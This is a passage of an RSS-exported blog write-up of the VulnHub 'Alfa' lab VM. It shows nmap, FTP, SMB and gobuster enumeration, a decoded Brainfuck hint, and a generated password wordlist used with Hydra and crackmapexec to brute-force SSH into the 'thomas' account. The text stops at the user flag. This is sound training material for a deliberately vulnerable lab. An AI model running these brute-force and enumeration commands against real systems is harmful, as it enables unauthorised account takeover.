<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Brainfuck on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/brainfuck/</link>
    <description>Recent content in Brainfuck on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 13 Jun 2021 16:55:14 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/brainfuck/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VulnHub - Alfa</title>
      <link>https://fahmifj.github.io/vulnhub/alfa/</link>
      <pubDate>Sun, 13 Jun 2021 16:55:14 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/vulnhub/alfa/</guid>
      <description>Do a simple OSINT to get shell access and VNC hijack</description>
      <content:encoded><![CDATA[<p>Alfa starts with enumeration on FTP to obtain a username and an image file which named after a pet. It continues with finding a hidden path to intranet chat support from <code>robots.txt</code> file . The chat conversation reveals sensitive information and it allows me to guess a user&rsquo;s password for initial access. In the user&rsquo;s home directory, there is a VNC password, and it can be used to log into the currently running VNC server as root.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Generating password list</li>
<li>Brute-force FTP and SSH</li>
<li>VNC password decrypt</li>
<li>SSH tunneling</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Hydra</li>
<li>Crackmapexec</li>
<li>Gobuster</li>
<li>Brainfuck decoder - <a href="https://www.dcode.fr/brainfuck-language">https://www.dcode.fr/brainfuck-language</a></li>
<li>VNCviewer</li>
<li>pspy</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial scan with <code>nmap</code> discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.109
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00056s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">996</span> closed ports
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
</span></span><span class="line"><span class="cl">21/tcp  open  ftp         vsftpd 3.0.3
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Dec <span class="m">17</span> 13:02 thomas
</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:192.168.2.103
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">3</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: OPTIONS HEAD GET POST
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Alfa IT Solutions
</span></span><span class="line"><span class="cl">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:9C:8A:46 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span><span class="line"><span class="cl">Service Info: Host: ALFA<span class="p">;</span> OS: Unix
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Host script results:
</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s
</span></span><span class="line"><span class="cl"><span class="p">|</span> nbstat: NetBIOS name: ALFA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> Names:
</span></span><span class="line"><span class="cl"><span class="p">|</span>   ALFA&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   ALFA&lt;03&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   ALFA&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows 6.1 <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: alfa
</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: ALFA<span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Domain name: <span class="se">\x</span><span class="m">00</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   FQDN: alfa
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2021-04-22T08:41:36+02:00
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: guest
</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
</span></span><span class="line"><span class="cl"><span class="p">|</span>   challenge_response: supported
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   2.02: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2021-04-22T06:41:36
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: N/A
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds</span>
</span></span></code></pre></div><p><code>nmap</code> identified anonymous access is allowed on FTP.</p>
<p>Performing a full port scan, discovers the fifth port.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-22 02:53 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.109
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65530</span> closed ports
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp    open  ftp
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">65111/tcp open  unknown
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:9C:8A:46 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 36.32 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: <span class="m">65536</span> <span class="o">(</span>2.884MB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">65536</span> <span class="o">(</span>2.621MB<span class="o">)</span>
</span></span></code></pre></div><p>Poking port 65111 with <code>nc</code> reveals it&rsquo;s SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ nc 192.168.2.109 <span class="m">65111</span>
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
<p>Enumeration with on FTP discovers a potential username called <code>thomas</code>, an image file named <code>milo.jpg</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ ftp 192.168.2.109 
</span></span><span class="line"><span class="cl">Connected to 192.168.2.109.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>192.168.2.109:root<span class="o">)</span>: anonymous
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password:
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; dir
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> <span class="m">0</span>        <span class="m">0</span>            <span class="m">4096</span> Dec <span class="m">17</span> 13:02 thomas
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">cd</span> thomas
</span></span><span class="line"><span class="cl"><span class="m">250</span> Directory successfully changed.
</span></span><span class="line"><span class="cl">ftp&gt; dir
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>          <span class="m">104068</span> Dec <span class="m">17</span> 12:49 milo.jpg
</span></span></code></pre></div><p><code>milo.jpg</code> is a picture of a dog.</p>
<p><div class="img-container"><img src="imgs/image-20210613181756997.png" alt="image-20210613181756997"  /></div>
</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>On SMB, anonymous access is allowed but no read permission there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ crackmapexec smb 192.168.2.109 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>*<span class="o">]</span> Windows 6.1 <span class="o">(</span>name:ALFA<span class="o">)</span> <span class="o">(</span>domain:<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>+<span class="o">]</span> <span class="se">\A</span>NONYMOUS: 
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             Share           Permissions     Remark
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             -----           -----------     ------
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             print$                          Printer Drivers
</span></span><span class="line"><span class="cl">SMB         192.168.2.109   <span class="m">445</span>    ALFA             IPC$                            IPC Service <span class="o">(</span>Samba 4.9.5-Debian<span class="o">)</span>
</span></span></code></pre></div><h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Visiting port 80 shows a website titled with &ldquo;Alfa IT Solutions&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422143723577.png" alt="image-20210422143723577"  /></div>
</p>
<p>Nothing useful on the page source.</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>gobuster</code> scan discovers a <code>robot.txt</code> file</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://192.168.2.109/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              html,txt,bak
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/04/22 02:46:48 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 311<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/js/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 315<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/images/<span class="o">]</span>
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/css/<span class="o">]</span>   
</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 3870<span class="o">]</span>                                  
</span></span><span class="line"><span class="cl">/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314<span class="o">]</span> <span class="o">[</span>--&gt; http://192.168.2.109/fonts/<span class="o">]</span> 
</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459<span class="o">]</span>                                   
</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278<span class="o">]</span> 
</span></span></code></pre></div><h4 id="robotstxt">robots.txt</h4>
<p>Accessing <code>robots.txt</code> discovers some directories. But, these are just dummy.</p>
<p><div class="img-container"><img src="imgs/image-20210422134810181.png" alt="image-20210422134810181"  /></div>
</p>
<p>Poking the <code>robots.txt</code> file with <code>curl</code> discovers a string which looks like a brainfuck language.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ curl -s http://192.168.2.109/robots.txt
</span></span><span class="line"><span class="cl">/home <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/admin <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/login <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/images <span class="c1">#200, directory listing, nothing interesting</span>
</span></span><span class="line"><span class="cl">/cgi-bin <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/intranet <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/wp-admin <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">/wp-login <span class="c1">#404</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">++++++++++<span class="o">[</span>&gt;+&gt;+++&gt;+++++++&gt;++++++++++<span class="o">&lt;&lt;&lt;</span>&lt;-<span class="o">]</span>&gt;&gt;+++++++++++++++++.&gt;&gt;---.+++++++++++.------.-----.&lt;&lt;--.&gt;&gt;++++++++++++++++++.++.-----..-.+++.++.
</span></span></code></pre></div><p>Using <a href="https://www.dcode.fr/brainfuck-language">this site</a>, the string gets translated as <code>/alfa-support</code> .</p>
<p><div class="img-container"><img src="imgs/image-20210613181246585.png" alt="image-20210613181246585"  /></div>
</p>
<h4 id="alfa-support">/alfa-support</h4>
<p>On <code>/alfa-support</code>, there is a chat between Thomas as the employee and the IT support operator (I think?).</p>
<p><div class="img-container"><img src="imgs/image-20210422143814423.png" alt="image-20210422143814423"  /></div>
</p>
<p>From the conversation above, I&rsquo;ll note that Thomas uses a password that consists of his(or her?) pet&rsquo;s name followed by 3 numerical digits.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-thomas">Shell as Thomas</h3>
<h4 id="creating-wordlist">Creating Wordlist</h4>
<p>From the previous FTP enumeration, &lsquo;milo&rsquo; is most likely the name of Thomas&rsquo;s pet.  With <code>bash</code>, I could generate all the possible password used by Thomas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in <span class="o">{</span>000..999<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&#34;milo</span><span class="nv">$i</span><span class="s2">&#34;</span><span class="p">;</span> <span class="k">done</span> <span class="p">|</span> tee passwords
</span></span><span class="line"><span class="cl">milo000
</span></span><span class="line"><span class="cl">milo001
</span></span><span class="line"><span class="cl">milo002
</span></span><span class="line"><span class="cl">milo003
</span></span><span class="line"><span class="cl">...&lt;snip&gt;...
</span></span></code></pre></div><h4 id="brute-force---ftp">Brute force - FTP</h4>
<p>I tried it with Hydra on FTP but returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ hydra -l thomas -P passwords ftp://192.168.2.103 
</span></span><span class="line"><span class="cl">Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2021-04-22 03:43:09
</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Restorefile <span class="o">(</span>you have <span class="m">10</span> seconds to abort... <span class="o">(</span>use option -I to skip waiting<span class="o">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">16</span> tasks per <span class="m">1</span> server, overall <span class="m">16</span> tasks, <span class="m">1000</span> login tries <span class="o">(</span>l:1/p:1000<span class="o">)</span>, ~63 tries per task
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ftp://192.168.2.103:21/
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 320.00 tries/min, <span class="m">320</span> tries in 00:01h, <span class="m">713</span> to <span class="k">do</span> in 00:03h, <span class="m">16</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 317.00 tries/min, <span class="m">634</span> tries in 00:02h, <span class="m">399</span> to <span class="k">do</span> in 00:02h, <span class="m">16</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 315.67 tries/min, <span class="m">947</span> tries in 00:03h, <span class="m">86</span> to <span class="k">do</span> in 00:01h, <span class="m">16</span> active
</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target completed, <span class="m">0</span> valid passwords found
</span></span><span class="line"><span class="cl"><span class="o">[</span>WARNING<span class="o">]</span> Writing restore file because <span class="m">15</span> final worker threads did not <span class="nb">complete</span> <span class="k">until</span> end.
</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">15</span> targets did not resolve or could not be connected
</span></span><span class="line"><span class="cl"><span class="o">[</span>ERROR<span class="o">]</span> <span class="m">0</span> targets did not <span class="nb">complete</span>
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-04-22 03:46:35
</span></span></code></pre></div><h4 id="brute-force---ssh">Brute force - SSH</h4>
<p>This time I will use <code>crackmapexec</code> , and I will divide the wordlist into two files</p>
<ul>
<li>passwords1: 000-500</li>
<li>passwords2: 500-999</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port <span class="m">65111</span>
</span></span></code></pre></div><p>After some minutes it returns one valid combination: <code>thomas:milo666</code></p>
<p><div class="img-container"><img src="imgs/image-20210422151432013.png" alt="image-20210422151432013"  /></div>
</p>
<h4 id="ssh---thomas">SSH - Thomas</h4>
<p>I&rsquo;ll just log in via SSH and grabs the flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «alfa» «192.168.2.103» 
</span></span><span class="line"><span class="cl">$ ssh -p <span class="m">65111</span> thomas@192.168.2.109
</span></span><span class="line"><span class="cl">thomas@192.168.2.109<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Linux Alfa 4.19.0-13-amd64 <span class="c1">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  ,---------------------------,                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  |  /---------------------\  |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |                       | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |         +----+        | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |         |ALFA|        | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |         +----+        | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  | |                       | |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  |  \_____________________/  |                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                  |___________________________|                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#                ,---\_____     []     _______/------,             #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#              /         /______________\           /|             #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            /___________________________________ /  | ___         #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |                                   |   |    )        #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |  _ _ _                 [-------]  |   |   (         #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |  o o o                 [-------]  |  /    _)_       #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#            |__________________________________ |/     /  /       #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#        /-------------------------------------/|      ( )/        #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#      /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                   #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#    /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /                     #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                       #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗    #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝    #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#  ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">#   ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝  #</span>
</span></span><span class="line"><span class="cl"><span class="c1">####################################################################</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">thomas@Alfa:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span> <span class="nv">grupos</span><span class="o">=</span>1000<span class="o">(</span>thomas<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
</span></span><span class="line"><span class="cl">thomas@Alfa:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> thomas thomas <span class="m">1332</span> dic <span class="m">20</span> 11:04 user.txt
